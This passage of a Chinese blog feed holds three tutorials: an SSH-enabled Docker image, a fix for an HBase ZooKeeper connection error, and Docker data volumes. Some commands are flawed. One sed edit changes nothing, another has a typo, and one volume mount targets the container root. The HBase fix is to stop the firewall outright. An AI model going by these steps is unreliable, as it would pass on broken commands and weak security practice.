trusty-updates/universe amd64 Packages [671 kB]</span><br><span class="line">Get:21 http://mirrors.aliyun.com trusty-updates/multiverse amd64 Packages [16.1 kB]</span><br><span class="line">Get:22 http://mirrors.aliyun.com trusty Release [58.5 kB]</span><br><span class="line">Get:23 http://mirrors.aliyun.com trusty-proposed/main Sources [1518 B]    </span><br><span class="line">Get:24 http://mirrors.aliyun.com trusty-proposed/restricted Sources [699 B]</span><br><span class="line">Get:25 http://mirrors.aliyun.com trusty-proposed/universe Sources [18.3 kB]</span><br><span class="line">Get:26 http://mirrors.aliyun.com trusty-proposed/multiverse Sources [40 B]</span><br><span class="line">Get:27 http://mirrors.aliyun.com trusty-proposed/main amd64 Packages [4519 B]</span><br><span class="line">Get:28 http://mirrors.aliyun.com trusty-proposed/restricted amd64 Packages [681 B]</span><br><span class="line">Get:29 http://mirrors.aliyun.com trusty-proposed/universe amd64 Packages [10.5 kB]</span><br><span class="line">Get:30 http://mirrors.aliyun.com trusty-proposed/multiverse amd64 Packages [40 B]</span><br><span class="line">Get:31 http://mirrors.aliyun.com trusty-backports/main Sources [10.4 kB]</span><br><span class="line">Get:32 http://mirrors.aliyun.com trusty-backports/restricted Sources [40 B]</span><br><span class="line">Get:33 http://mirrors.aliyun.com trusty-backports/universe Sources [41.3 kB]</span><br><span class="line">Get:34 http://mirrors.aliyun.com trusty-backports/multiverse Sources [1747 B]</span><br><span class="line">Get:35 http://mirrors.aliyun.com trusty-backports/main amd64 Packages [14.7 kB]</span><br><span class="line">Get:36 http://mirrors.aliyun.com trusty-backports/restricted amd64 Packages [40 B]</span><br><span class="line">Get:37 http://mirrors.aliyun.com trusty-backports/universe amd64 Packages [52.5 kB]</span><br><span class="line">Get:38 http://mirrors.aliyun.com trusty-backports/multiverse amd64 Packages [1392 B]</span><br><span class="line">Get:39 http://mirrors.aliyun.com trusty/main Sources [1335 kB]</span><br><span class="line">Get:40 http://mirrors.aliyun.com trusty/restricted Sources [5335 B]</span><br><span class="line">Get:41 http://mirrors.aliyun.com trusty/universe Sources [7926 kB]</span><br><span class="line">Get:42 http://mirrors.aliyun.com trusty/multiverse Sources [211 kB]</span><br><span class="line">Get:43 http://mirrors.aliyun.com trusty/main amd64 Packages [1743 kB]</span><br><span class="line">Get:44 http://mirrors.aliyun.com trusty/restricted amd64 Packages [16.0 kB]</span><br><span class="line">Get:45 http://mirrors.aliyun.com trusty/universe amd64 Packages [7589 kB]</span><br><span class="line">Get:46 http://mirrors.aliyun.com trusty/multiverse amd64 Packages [169 kB]     </span><br><span class="line">Fetched 24.3 MB <span class="keyword">in</span> 8s (3029 kB/s)                                              </span><br><span class="line">Reading package lists... Done</span><br></pre></td></tr></table></figure><p>安装ssh服务<br><code>apt-get install openssh-server -y</code></p><p>如果需要正常启动SSH服务，则目录/var/run/sshd必须存在。手动创建并启动SSH服务：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">root@b44d403a0d52:/# mkdir -p /var/run/sshd           </span><br><span class="line">root@b44d403a0d52:/# /usr/sbin/sshd -D &amp;</span><br><span class="line">[1] 3035</span><br><span class="line">root@b44d403a0d52:/#</span><br></pre></td></tr></table></figure></p><p>此时查看容器的22端口：</p><p><code>root@b44d403a0d52:/# netstat -lnutp | grep 22</code><br><img src="https://img-blog.csdnimg.cn/2019110419034698.png" alt="在这里插入图片描述"></p><p>修改SSH服务的安全登录配置，取消pam登陆限制：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@b44d403a0d52:/# sed -ri &apos;s#session    required     pam_loginuid.so#session    required     pam_loginuid.so#g&apos; /etc/pam.d/sshd</span><br><span class="line">root@b44d403a0d52:/#</span><br></pre></td></tr></table></figure></p><p>在root用户家目录创建.ssh目录，并将<strong>宿主机的登录的公钥信息</strong>复制到.ssh目录下的authorized_keys中：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">root@b44d403a0d52:/# mkdir /root/.ssh</span><br><span class="line">root@b44d403a0d52:/# cd /root/.ssh</span><br><span class="line">root@b44d403a0d52::~/.ssh# ls</span><br><span class="line">root@b44d403a0d52:~/.ssh# vi /root/.ssh/authorized_keys</span><br></pre></td></tr></table></figure></p><p>创建自启动的SSH服务可执行文件run.sh，并添加可执行权限：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">root@b44d403a0d52:/# cat run.sh</span><br><span class="line">#!/bin/bash</span><br><span class="line">/usr/sbin/sshd -D &amp;</span><br><span class="line">root@b44d403a0d52:/# chmod +x run.sh</span><br><span class="line">root@b44d403a0d52:/#</span><br></pre></td></tr></table></figure></p><p>保存镜像:<br><code>[root@node1 ~]# docker commit b44 sshd:ubuntu</code></p><p><img src="https://img-blog.csdnimg.cn/2019110419095247.png" alt="在这里插入图片描述"></p><h3 id="使用镜像"><a href="#使用镜像" class="headerlink" title="使用镜像"></a>使用镜像</h3><p>启动容器，并添加端口映射10022–&gt;22。其中10022是宿主主机的端口，22是容器的SSH服务监听的端口:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[root@node1 ~]# docker run -it --name sshd_ubuntu -p 10022:22 sshd:ubuntu</span><br><span class="line">root@2f3d3f69a26c:/#</span><br></pre></td></tr></table></figure></p><p>查看ip<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">root@2f3d3f69a26c:/# ip a            </span><br><span class="line">1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000</span><br><span class="line">    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00</span><br><span class="line">    inet 127.0.0.1/8 scope host lo</span><br><span class="line">       valid_lft forever preferred_lft forever</span><br><span class="line">    inet6 ::1/128 scope host </span><br><span class="line">       valid_lft forever preferred_lft forever</span><br><span class="line">27: eth0@if28: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc noqueue state UP group default </span><br><span class="line">    link/ether 02:42:ac:11:00:03 brd ff:ff:ff:ff:ff:ff</span><br><span class="line">    inet 172.17.0.3/16 scope global eth0</span><br><span class="line">       valid_lft forever preferred_lft forever</span><br><span class="line">    inet6 fe80::42:acff:fe11:3/64 scope link </span><br><span class="line">       valid_lft forever preferred_lft forever</span><br><span class="line">root@2f3d3f69a26c:/# </span><br><span class="line">`</span><br></pre></td></tr></table></figure></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">[root@node1 ~]# ssh 172.17.0.3</span><br><span class="line">The authenticity of host &apos;172.17.0.3 (172.17.0.3)&apos; can&apos;t be established.</span><br><span class="line">ECDSA key fingerprint is SHA256:E52UcTYNRUigoz7AjFcNNZxtxMAxfuXb2Oqn71wZIXA.</span><br><span class="line">ECDSA key fingerprint is MD5:6f:4f:32:90:c8:59:6b:cb:b3:fa:92:32:71:46:eb:e3.</span><br><span class="line">Are you sure you want to continue connecting (yes/no)? yes</span><br><span class="line">Warning: Permanently added &apos;172.17.0.3&apos; (ECDSA) to the list of known hosts.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Welcome to Ubuntu 14.04 LTS (GNU/Linux 4.4.0-146-generic x86_64)</span><br><span class="line"></span><br><span class="line"> * Documentation:  https://help.ubuntu.com/</span><br><span class="line"></span><br><span class="line">The programs included with the Ubuntu system are free software;</span><br><span class="line">the exact distribution terms for each program are described in the</span><br><span class="line">individual files in /usr/share/doc/*/copyright.</span><br><span class="line"></span><br><span class="line">Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by</span><br><span class="line">applicable law.</span><br><span class="line"></span><br><span class="line">root@2f3d3f69a26c:~# </span><br><span class="line">root@2f3d3f69a26c:~#</span><br></pre></td></tr></table></figure><h2 id="使用Dockerfile创建"><a href="#使用Dockerfile创建" class="headerlink" title="使用Dockerfile创建"></a>使用Dockerfile创建</h2><h3 id="创建工作目录"><a href="#创建工作目录" class="headerlink" title="创建工作目录"></a>创建工作目录</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[root@node1 ~]<span class="comment"># mkdir ubuntu</span></span><br><span class="line">[root@node1 ~]<span class="comment"># cd ubuntu</span></span><br><span class="line">[root@node1 ubuntu]<span class="comment"># touch Dockerfile run.sh</span></span><br><span class="line">[root@node1 ubuntu]<span class="comment"># ls</span></span><br><span class="line">Dockerfile  run.sh</span><br><span class="line">[root@node1 ubuntu]<span class="comment">#</span></span><br></pre></td></tr></table></figure><p>在该目录中创建Dockerfile和run.sh文件</p><h3 id="编写run-sh脚本和authorized-keys文件"><a href="#编写run-sh脚本和authorized-keys文件" class="headerlink" title="编写run.sh脚本和authorized_keys文件"></a>编写run.sh脚本和authorized_keys文件</h3><p>run.sh脚本内容如下:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#!/bin/bash</span><br><span class="line">/usr/sbin/sshd -D</span><br></pre></td></tr></table></figure></p><p>在宿主主机上生成SSH密钥，并创建authorized_keys文件:</p><p><code>ssh-keygen -t rsa</code></p><p><code>cp /root/.ssh/authorized_keys ./</code></p><h3 id="编写Dockerfile文件"><a href="#编写Dockerfile文件" class="headerlink" title="编写Dockerfile文件"></a>编写Dockerfile文件</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">#设置继承镜像</span><br><span class="line">FROM ubuntu:14.04</span><br><span class="line"></span><br><span class="line">#提供一些作者信息</span><br><span class="line">MAINTAINER docker_user(user@docer.com)</span><br><span class="line"></span><br><span class="line">#下面开始运行更新命令</span><br><span class="line">RUN apt-get update</span><br><span class="line"></span><br><span class="line">#安装ssh服务</span><br><span class="line">RUN apt-get install -y openssh-server</span><br><span class="line">RUN mkdir -p /var/run/sshd</span><br><span class="line">RUN mkdir -p /root/.ssh</span><br><span class="line"></span><br><span class="line">#取消pam限制</span><br><span class="line">RUN sed -ri &apos;s/session required pam_loginuid.sh/#session required pam_loginuid.so/g&apos; /etc/pam.d/sshd</span><br><span class="line"></span><br><span class="line">#复制配置文件到相应位置,并赋予脚本可执行权限</span><br><span class="line">ADD authorized_keys /root/.ssh/authorized_keys</span><br><span class="line">ADD run.sh /run.sh</span><br><span class="line">RUN chmod 755 /run.sh</span><br><span class="line"></span><br><span class="line">#开放端口</span><br><span class="line">EXPOSE 22</span><br><span class="line"></span><br><span class="line">#设置自启动命令</span><br><span class="line">CMD [&quot;/run.sh&quot;]</span><br></pre></td></tr></table></figure><h3 id="创建镜像"><a href="#创建镜像" class="headerlink" title="创建镜像"></a>创建镜像</h3><p>执行该命令即可创建镜像<br><code>docker build -t sshd:dockerfile .</code></p><p>记得必须要在Dockerfile文件存在的目录执行该命令否则会报找不到目录异常</p><p><img src="https://img-blog.csdnimg.cn/20191104195642349.png" alt="在这里插入图片描述"><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">[root@node1 ~]# ssh 172.17.0.2</span><br><span class="line">The authenticity of host &apos;172.17.0.2 (172.17.0.2)&apos; can&apos;t be established.</span><br><span class="line">ECDSA key fingerprint is SHA256:E52UcTYNRUigoz7AjFcNNZxtxMAxfuXb2Oqn71wZIXA.</span><br><span class="line">ECDSA key fingerprint is MD5:6f:4f:32:90:c8:59:6b:cb:b3:fa:92:32:71:46:eb:e3.</span><br><span class="line">Are you sure you want to continue connecting (yes/no)? yes</span><br><span class="line">Warning: Permanently added &apos;172.17.0.2&apos; (ECDSA) to the list of known hosts.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Welcome to Ubuntu 14.04 LTS (GNU/Linux 4.4.0-146-generic x86_64)</span><br><span class="line"></span><br><span class="line"> * Documentation:  https://help.ubuntu.com/</span><br><span class="line"></span><br><span class="line">The programs included with the Ubuntu system are free software;</span><br><span class="line">the exact distribution terms for each program are described in the</span><br><span class="line">individual files in /usr/share/doc/*/copyright.</span><br><span class="line"></span><br><span class="line">Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by</span><br><span class="line">applicable law.</span><br><span class="line"></span><br><span class="line">root@1c79d6ccaebe:~# </span><br><span class="line">root@1c79d6ccaebe:~#</span><br></pre></td></tr></table></figure></p><p>连接成功!</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;基于docker-commit命令创建&quot;&gt;&lt;a href=&quot;#基于docker-commit命令创建&quot; class=&quot;headerlink&quot; title=&quot;基于docker commit命令创建&quot;&gt;&lt;/a&gt;基于docker commit命令创建&lt;/h2&gt;&lt;p&gt;Do
      
    
    </summary>
    
      <category term="Docker" scheme="https://plutoacharon.github.io/categories/Docker/"/>
    
    
      <category term="Docker" scheme="https://plutoacharon.github.io/tags/Docker/"/>
    
  </entry>
  
  <entry>
    <title>hbase shell报错:zookeeper.RecoverableZooKeeper: ZooKeeper exists failed after 4 attempts</title>
    <link href="https://plutoacharon.github.io/2019/11/04/hbase-shell%E6%8A%A5%E9%94%99-zookeeper-RecoverableZooKeeper-ZooKeeper-exists-failed-after-4-attempts/"/>
    <id>https://plutoacharon.github.io/2019/11/04/hbase-shell报错-zookeeper-RecoverableZooKeeper-ZooKeeper-exists-failed-after-4-attempts/</id>
    <published>2019-11-04T10:04:48.000Z</published>
    <updated>2019-11-28T09:33:12.635Z</updated>
    
    <content type="html"><![CDATA[<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line">2019-11-04 16:03:02,954 ERROR [main] zookeeper.RecoverableZooKeeper: ZooKeeper exists failed after 4 attempts</span><br><span class="line">2019-11-04 16:03:02,956 WARN  [main] zookeeper.ZKUtil: hconnection-0x7412ed6b0x0, quorum=node1:2181,node2:2181,node3:2181, baseZNode=/hbase Unable to set watcher on znode (/hbase/hbaseid)</span><br><span class="line">org.apache.zookeeper.KeeperException$ConnectionLossException: KeeperErrorCode = ConnectionLoss for /hbase/hbaseid</span><br><span class="line">at org.apache.zookeeper.KeeperException.create(KeeperException.java:99)</span><br><span class="line">at org.apache.zookeeper.KeeperException.create(KeeperException.java:51)</span><br><span class="line">at org.apache.zookeeper.ZooKeeper.exists(ZooKeeper.java:1045)</span><br><span class="line">at org.apache.hadoop.hbase.zookeeper.RecoverableZooKeeper.exists(RecoverableZooKeeper.java:220)</span><br><span class="line">at org.apache.hadoop.hbase.zookeeper.ZKUtil.checkExists(ZKUtil.java:419)</span><br><span class="line">at org.apache.hadoop.hbase.zookeeper.ZKClusterId.readClusterIdZNode(ZKClusterId.java:65)</span><br><span class="line">at org.apache.hadoop.hbase.client.ZooKeeperRegistry.getClusterId(ZooKeeperRegistry.java:105)</span><br><span class="line">at org.apache.hadoop.hbase.client.ConnectionManager$HConnectionImplementation.retrieveClusterId(ConnectionManager.java:905)</span><br><span class="line">at org.apache.hadoop.hbase.client.ConnectionManager$HConnectionImplementation.<span class="tag">&lt;<span class="name">init</span>&gt;</span>(ConnectionManager.java:648)</span><br><span class="line">at sun.reflect.NativeConstructorAccessorImpl.newInstance0(Native Method)</span><br><span class="line">at sun.reflect.NativeConstructorAccessorImpl.newInstance(NativeConstructorAccessorImpl.java:62)</span><br><span class="line">at sun.reflect.DelegatingConstructorAccessorImpl.newInstance(DelegatingConstructorAccessorImpl.java:45)</span><br><span class="line">at java.lang.reflect.Constructor.newInstance(Constructor.java:423)</span><br><span class="line">at org.apache.hadoop.hbase.client.ConnectionFactory.createConnection(ConnectionFactory.java:238)</span><br><span class="line">at org.apache.hadoop.hbase.client.ConnectionFactory.createConnection(ConnectionFactory.java:218)</span><br><span class="line">at org.apache.hadoop.hbase.client.ConnectionFactory.createConnection(ConnectionFactory.java:119)</span><br><span class="line">at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)</span><br><span class="line">at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62)</span><br><span class="line">at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)</span><br><span class="line">at java.lang.reflect.Method.invoke(Method.java:498)</span><br><span class="line">at org.jruby.javasupport.JavaMethod.invokeDirectWithExceptionHandling(JavaMethod.java:450)</span><br><span class="line">at org.jruby.javasupport.JavaMethod.invokeStaticDirect(JavaMethod.java:362)</span><br><span class="line">at org.jruby.java.invokers.StaticMethodInvoker.call(StaticMethodInvoker.java:58)</span><br><span class="line">at org.jruby.runtime.callsite.CachingCallSite.cacheAndCall(CachingCallSite.java:312)</span><br><span class="line">at org.jruby.runtime.callsite.CachingCallSite.call(CachingCallSite.java:169)</span><br><span class="line">at org.jruby.ast.CallOneArgNode.interpret(CallOneArgNode.java:57)</span><br><span class="line">at org.jruby.ast.InstAsgnNode.interpret(InstAsgnNode.java:95)</span><br><span class="line">at org.jruby.ast.NewlineNode.interpret(NewlineNode.java:104)</span><br><span class="line">at org.jruby.ast.BlockNode.interpret(BlockNode.java:71)</span><br><span class="line">at org.jruby.evaluator.ASTInterpreter.INTERPRET_METHOD(ASTInterpreter.java:74)</span><br><span class="line">at org.jruby.internal.runtime.methods.InterpretedMethod.call(InterpretedMethod.java:169)</span><br><span class="line">at org.jruby.internal.runtime.methods.DefaultMethod.call(DefaultMethod.java:191)</span><br><span class="line">at org.jruby.runtime.callsite.CachingCallSite.cacheAndCall(CachingCallSite.java:302)</span><br><span class="line">at org.jruby.runtime.callsite.CachingCallSite.callBlock(CachingCallSite.java:144)</span><br><span class="line">at org.jruby.runtime.callsite.CachingCallSite.call(CachingCallSite.java:148)</span><br><span class="line">at org.jruby.RubyClass.newInstance(RubyClass.java:822)</span><br><span class="line">at org.jruby.RubyClass$i$newInstance.call(RubyClass$i$newInstance.gen:65535)</span><br><span class="line">at org.jruby.internal.runtime.methods.JavaMethod$JavaMethodZeroOrNBlock.call(JavaMethod.java:249)</span><br><span class="line">at org.jruby.runtime.callsite.CachingCallSite.cacheAndCall(CachingCallSite.java:292)</span><br><span class="line">at org.jruby.runtime.callsite.CachingCallSite.call(CachingCallSite.java:135)</span><br><span class="line">at usr.hbase.hbase_minus_1_dot_2_dot_4.bin.hirb.__file__(/usr/hbase/hbase-1.2.4//bin/hirb.rb:131)</span><br><span class="line">at usr.hbase.hbase_minus_1_dot_2_dot_4.bin.hirb.load(/usr/hbase/hbase-1.2.4//bin/hirb.rb)</span><br><span class="line">at org.jruby.Ruby.runScript(Ruby.java:697)</span><br><span class="line">at org.jruby.Ruby.runScript(Ruby.java:690)</span><br><span class="line">at org.jruby.Ruby.runNormally(Ruby.java:597)</span><br><span class="line">at org.jruby.Ruby.runFromMain(Ruby.java:446)</span><br><span class="line">at org.jruby.Main.doRunFromMain(Main.java:369)</span><br><span class="line">at org.jruby.Main.internalRun(Main.java:258)</span><br><span class="line">at org.jruby.Main.run(Main.java:224)</span><br><span class="line">at org.jruby.Main.run(Main.java:208)</span><br><span class="line">at org.jruby.Main.main(Main.java:188)</span><br></pre></td></tr></table></figure><p>解决办法，启动你的Zookeeper</p><p>记得启动起来以后进行查看。</p><p>如果你的Zookeeper启动起来了，还报这个错误，那么就是关闭防火墙即可<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">systemctl status firewalld</span><br><span class="line">systemctl stop firewalld</span><br></pre></td></tr></table></figure></p><p>再次输入<code>hbase shell</code></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;figure class=&quot;highlight xml&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;
      
    
    </summary>
    
      <category term="Hadoop" scheme="https://plutoacharon.github.io/categories/Hadoop/"/>
    
    
      <category term="Hbase" scheme="https://plutoacharon.github.io/tags/Hbase/"/>
    
  </entry>
  
  <entry>
    <title>Docker数据管理:实现将主机目录挂载到容器中并共享</title>
    <link href="https://plutoacharon.github.io/2019/11/04/Docker%E6%95%B0%E6%8D%AE%E7%AE%A1%E7%90%86-%E5%AE%9E%E7%8E%B0%E5%B0%86%E4%B8%BB%E6%9C%BA%E7%9B%AE%E5%BD%95%E6%8C%82%E8%BD%BD%E5%88%B0%E5%AE%B9%E5%99%A8%E4%B8%AD%E5%B9%B6%E5%85%B1%E4%BA%AB/"/>
    <id>https://plutoacharon.github.io/2019/11/04/Docker数据管理-实现将主机目录挂载到容器中并共享/</id>
    <published>2019-11-04T10:03:57.000Z</published>
    <updated>2019-11-04T10:04:17.717Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Docker-数据管理"><a href="#Docker-数据管理" class="headerlink" title="Docker 数据管理"></a>Docker 数据管理</h2><p>Docker    内部以及容器之间管理数据，在容器中管理数据主要有两种方式：</p><ul><li>数据卷（Data    volumes）</li><li>数据卷容器（Data    volume    containers）</li></ul><h3 id="数据卷"><a href="#数据卷" class="headerlink" title="数据卷"></a>数据卷</h3><p>数据卷是一个可供一个或多个容器使用的特殊目录，它绕过    UFS，可以提供很多有用的特性：</p><ul><li>数据卷可以在容器之间共享和重用</li><li>对数据卷的修改会立马生效</li><li>对数据卷的更新，不会影响镜像</li><li>卷会一直存在，直到没有容器使用</li></ul><blockquote><p>数据卷的使用类似于liunx下的mount操作</p></blockquote><h3 id="创建一个数据卷"><a href="#创建一个数据卷" class="headerlink" title="创建一个数据卷"></a>创建一个数据卷</h3><p>在用        <code>docker    run</code>        命令的时候，使用        <code>-v</code>        标记来创建一个数据卷并挂载到容器里。在一次    <code>run</code>    中多次使用<br>可以挂载多个数据卷。</p><h3 id="挂载一个主机目录作为数据卷"><a href="#挂载一个主机目录作为数据卷" class="headerlink" title="挂载一个主机目录作为数据卷"></a>挂载一个主机目录作为数据卷</h3><p><code>docker run -d -v /test:/</code></p><p>上面的命令加载主机的<code>/test</code>目录到容器的<code>/</code>目录。这个功能在进行测试的时候十分方便，比如用户可以放置一些程序到本地目录中，来查看容器是否正常工作。</p><p>本地目录的路径必须是绝对路径，如果目录不存在    Docker    会自动为你创建它。</p><blockquote><p>注意：Dockerfile    中不支持这种用法，这是因为    Dockerfile    是为了移植和分享用的。然而，不同操作系统<br>的路径格式不一样，所以目前还不能支持。</p></blockquote><p>Docker    挂载数据卷的默认权限是读写，用户也可以通过<code>:ro</code>指定为只读<br><code>docker run -d -v /test:/:ro</code></p><h3 id="挂载一个本地主机文件作为数据卷"><a href="#挂载一个本地主机文件作为数据卷" class="headerlink" title="挂载一个本地主机文件作为数据卷"></a>挂载一个本地主机文件作为数据卷</h3><p><code>-v</code>    标记也可以从主机挂载单个文件到容器中<br><code>docker    run    --rm    -it    -v    ~/.bash_history:/.bash_history    ubuntu    /bin/bash</code><br>这样就可以记录在容器输入过的命令了。</p><h3 id="数据卷容器"><a href="#数据卷容器" class="headerlink" title="数据卷容器"></a>数据卷容器</h3><p>如果你有一些持续更新的数据需要在容器之间共享，最好创建数据卷容器。</p><p>数据卷容器，其实就是一个正常的容器，专门用来提供数据卷供其它容器挂载的。</p><p>首先，创建一个命名的数据卷容器    dbdata：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[root@node1 ~]<span class="comment"># docker run -it -v /dbdata --name dbdata ubuntu</span></span><br><span class="line">root@34c4f0da05b5:/<span class="comment"># ls</span></span><br><span class="line">bin  boot  dbdata  dev  etc  home  lib  lib64  media  mnt  opt  proc  root  run  sbin  srv  sys  tmp  usr  var</span><br><span class="line">root@34c4f0da05b5:/<span class="comment">#</span></span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20191102140858622.png" alt="在这里插入图片描述"><br>然后，在其他容器中使用<code>--volumes-from</code>来挂载    dbdata    容器中的数据卷</p><p><code>docker run -it --volumes-from dbdata --name db1 ubuntu</code><br><code>docker run -it --volumes-from dbdata --name db2 ubuntu</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[root@node1 ~]<span class="comment"># docker run -it --volumes-from dbdata --name db1 ubuntu</span></span><br><span class="line">root@bd57e1fea5ae:/<span class="comment"># ls</span></span><br><span class="line">bin  boot  dbdata  dev  etc  home  lib  lib64  media  mnt  opt  proc  root  run  sbin  srv  sys  tmp  usr  var</span><br><span class="line">root@bd57e1fea5ae:/<span class="comment">#</span></span><br></pre></td></tr></table></figure><p>此时,容器db1和db2都挂载同一个数据卷到相同的/dbdata目录.三个容器任何一方在该目录下的写入,任何容器都能看到<br><img src="https://img-blog.csdnimg.cn/20191102141630388.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20191102141617314.png" alt="在这里插入图片描述"></p><p>可以多次使用<code>--volumes-from</code>参数来从多个容器挂载多个数据卷.还可以从其他已经挂载了容器卷的容器来挂载数据卷:</p><blockquote><p>使用<code>--volumes-from</code>参数所挂载数据卷的容器自身并不需要保持在运行状态</p></blockquote><p>如果删除了挂载的容器（包括    dbdata、db1    和    db2），数据卷并不会被自动删除。如果要删除一个数据卷，必须在删除最后一个还挂载着它的容器时使用    <code>docker    rm    -v</code>命令来指定同时删除关联的容器。    这可以让用户在容器之间升级和移动数据卷。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;Docker-数据管理&quot;&gt;&lt;a href=&quot;#Docker-数据管理&quot; class=&quot;headerlink&quot; title=&quot;Docker 数据管理&quot;&gt;&lt;/a&gt;Docker 数据管理&lt;/h2&gt;&lt;p&gt;Docker    内部以及容器之间管理数据，在容器中管理数据主要有
      
    
    </summary>
    
      <category term="Docker" scheme="https://plutoacharon.github.io/categories/Docker/"/>
    
    
      <category term="Docker" scheme="https://plutoacharon.github.io/tags/Docker/"/>
    
  </entry>
  
  <entry>
